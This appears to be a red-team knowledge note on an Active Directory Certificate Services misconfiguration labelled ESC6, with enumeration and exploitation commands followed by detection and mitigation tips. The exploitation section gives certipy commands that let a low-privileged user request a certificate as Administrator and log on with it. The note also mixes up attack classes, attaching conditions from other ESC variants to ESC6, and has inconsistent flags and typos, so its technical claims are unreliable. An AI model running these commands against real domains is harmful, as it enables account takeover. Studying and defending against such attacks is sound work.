---
tags:
  - attack
  - knowledge
  - AD
  - windows
  - redteam
date: 2023-09-1
---
- Certificate template misconfiguration.
- Template allows:
	- requester to supply own subject (`ENROLLEE_SUPPLIES_SUBJECT`)
	- EKU includes `Client Authentication` (or `Any Purpose`).
# Background

- [[ADCS (Active Directory Certificate Services)|AD CS]] allows cert-based authentication, such as smart card logon or [[PKINIT authentication|PKINIT]].
- Cert templates define what kind of certs users can request, and for what purpose.
- EKU defines what the cert can be used:
	- Client Authentication (1.3.6.1.5.5.7.3.2)
	- Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
	- Any Purpose (2.5.29.37.0) — indicates no restrictions on usage.
- If CA is trusted by AD, and cert has valid UPN, user can log on even if no access to the account.
# Vulnerability Criteria

- Vulnerable to ESC6 if:
	- `ENROLLEE_SUPPLIES_SUBJECT` is enabled.
	- EKU includes `Client Authentication` or `Any Purpose`
	- Attacker has enroll or autoenroll permissions.
	- Web enrollment is exposed via HTTP (not HTTPS).
	- CA is actively issuing certificates.
# Enumeration

- Find vulnerable templates:
	- `certipy find -u user@domain.local -p 'Pass123!' -dc-ip 10.0.0.5 -vulnerable`
- To dump all EKUs (PowerShell):
	- `Get-CertificateTemplate | Select-Object -ExpandProperty EKU`
- Confirm enrollment rights:
	- `certipy find -v -u user@domain.local -p 'Pass123!' --dc-ip 10.0.0.5`
# Exploitation

- If low privileged user is valid with enrollment rights over a vuln template:
	- `certipy req -u user@domain.local -p 'Pass123!' -ca ca01\corp-CA -template ESC6template -upn Administrator@domain.local -dc-ip 10.0.0.5 -output esc6`
- Authenticate using the cert:
	- `certipy auth -pfx esc6.pfx -dc-ip 10.0.0.5`
# Detection

- `Event IDs 4886/4887` - track cert issuance.
- Monitor for certs issued with unusual Subject/UPN.
- Monitor [[AS-REQ (Authentication Request)|AS-REQ]] patterns using cets.
- Use differential snapshots of cert templates to detect dangerous config changes.
# Mitigation

- Disable `ENROLLE_SUPPLIES_SUBJECT`.
- Avoid templates with `Any Purpose` or overly broad EKUs.
- Limit enroll permissions to specific security groups.
- Enable manager approval for sensitive templates.
- Periodically audit all cert templates:
	- `Get-CertificateTemplate | Select-Object -Property DisplayName, EKU, msPKI-Certificate-Name-Flag`